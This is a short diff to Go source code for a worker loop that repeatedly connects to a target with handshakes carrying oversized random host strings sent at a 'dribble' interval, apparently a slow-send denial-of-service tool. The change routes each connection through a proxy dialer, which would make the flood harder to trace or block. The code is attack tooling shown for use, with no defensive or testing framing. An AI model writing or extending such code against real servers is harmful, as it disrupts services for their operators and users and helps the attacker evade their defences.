@@ -997,7 +997,16 @@ func worker(target string, port uint16, bloatSize int, dribbleInterval time.Dura
 		host := randString(rng, bloatSize)
 		handshake := buildHandshake(host, port)
 
-		conn, err := net.DialTimeout("tcp", target, 10*time.Second)
+		dialer, err := getDialer()
+		if err != nil {
+			if verbose {
+				fmt.Fprintf(os.Stderr, "\nproxy dialer: %v\n", err)
+			}
+			time.Sleep(time.Second)
+			continue
+		}
+
+		conn, err := dialer.Dial("tcp", target)
 		if err != nil {
 			if verbose {
 				fmt.Fprintf(os.Stderr, "\ndial: %v\n", err)
